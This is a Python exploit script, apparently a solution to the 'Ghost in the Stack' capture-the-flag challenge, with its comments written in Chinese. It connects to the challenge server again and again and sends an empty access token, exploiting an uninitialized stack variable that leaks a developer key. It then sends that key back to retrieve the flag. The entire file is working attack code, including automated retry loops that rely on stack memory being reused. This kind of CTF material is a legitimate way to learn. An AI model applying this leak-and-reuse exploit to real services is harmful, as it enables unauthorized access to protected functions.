#!/usr/bin/env python3
import socket
import time
import sys

def test_uninitialized_variable():
    """专门测试未初始化变量漏洞"""
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 测试未初始化变量漏洞")
    print("[+] 策略: 在选项2中按回车，触发未初始化access_token与dev_key比较")
    print("-" * 60)
    
    attempts = 0
    max_attempts = 1000  # 最多尝试1000次连接
    
    for attempt in range(max_attempts):
        attempts += 1
        
        if attempt % 50 == 0:
            print(f"[进度] 尝试 {attempt+1}/{max_attempts}")
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            
            # 接收菜单
            s.recv(1024)
            
            # 选择选项2 (Access premium content)
            s.send(b"2\n")
            time.sleep(0.02)
            
            # 接收"Enter your premium access level"
            s.recv(1024)
            
            # 发送任意数字作为access level
            s.send(b"1\n")  
            time.sleep(0.02)
            
            # 接收"Enter access token in hex"提示
            s.recv(1024)
            
            # 发送空行触发未初始化变量漏洞
            s.send(b"\n")
            time.sleep(0.1)
            
            # 接收响应
            response = s.recv(2048).decode(errors='ignore')
            
            # 检查是否成功泄露了dev_key
            if "Developer Mode Key:" in response:
                print(f"\n[SUCCESS] 在第 {attempt+1} 次尝试中成功!")
                print(f"[泄露] {response}")
                
                # 提取dev_key值
                import re
                key_match = re.search(r"Developer Mode Key: (0x[0-9A-Fa-f]+)", response)
                if key_match:
                    dev_key_hex = key_match.group(1)
                    dev_key_int = int(dev_key_hex, 16)
                    
                    print(f"[密钥] {dev_key_hex} = {dev_key_int}")
                    s.close()
                    
                    # 使用泄露的密钥获取flag
                    return get_flag(host, port, dev_key_int)
                
            s.close()
            
        except Exception as e:
            continue
    
    print(f"[失败] 尝试了 {attempts} 次都没有成功")
    return False

def get_flag(host, port, key):
    """使用已知密钥获取flag"""
    print(f"[+] 使用密钥 {key} 获取flag...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # 跳过菜单
        s.recv(1024)
        
        # 选择选项1
        s.send(b"1\n")
        time.sleep(0.1)
        
        # 等待subscription提示
        s.recv(1024)
        
        # 发送密钥
        s.send(f"{key}\n".encode())
        time.sleep(0.2)
        
        # 接收响应
        response = s.recv(4096).decode(errors='ignore')
        print(f"[FLAG响应] {response}")
        
        s.close()
        return True
        
    except Exception as e:
        print(f"[错误] 获取flag失败: {e}")
        return False

def rapid_test():
    """快速连续测试，利用栈重用"""
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 快速连续测试策略")
    print("[+] 理论: 快速重连可能导致栈内存重用，增加碰撞概率")
    
    for batch in range(10):  # 10个批次
        print(f"[批次] {batch+1}/10")
        
        # 快速连续测试
        for i in range(100):  # 每批次100次
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((host, port))
                
                # 快速执行测试序列
                s.recv(512)           # 菜单
                s.send(b"2\n")        # 选项2
                s.recv(512)           # access level提示
                s.send(b"1\n")        # access level值
                s.recv(512)           # token提示  
                s.send(b"\n")         # 空token触发漏洞
                
                response = s.recv(1024).decode(errors='ignore')
                
                if "Developer Mode Key:" in response:
                    print(f"[SUCCESS] 批次{batch+1}第{i+1}次成功!")
                    print(f"[响应] {response}")
                    
                    # 提取并使用密钥
                    import re
                    key_match = re.search(r"0x([0-9A-Fa-f]+)", response)
                    if key_match:
                        key_int = int(key_match.group(1), 16)
                        s.close()
                        return get_flag(host, port, key_int)
                
                s.close()
                
            except:
                continue
            
            # 很短的延迟
            time.sleep(0.01)
    
    return False

def main():
    print("=" * 60)
    print("Ghost in the Stack - 未初始化变量利用")
    print("=" * 60)
    
    try:
        # 方法1: 系统化测试
        print("=== 方法1: 系统化未初始化变量测试 ===")
        if test_uninitialized_variable():
            return True
        
        # 方法2: 快速连续测试
        print("\n=== 方法2: 快速连续测试 ===")
        if rapid_test():
            return True
        
        print("\n[-] 所有方法都失败了")
        return False
        
    except KeyboardInterrupt:
        print("\n[中断] Ctrl+C")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)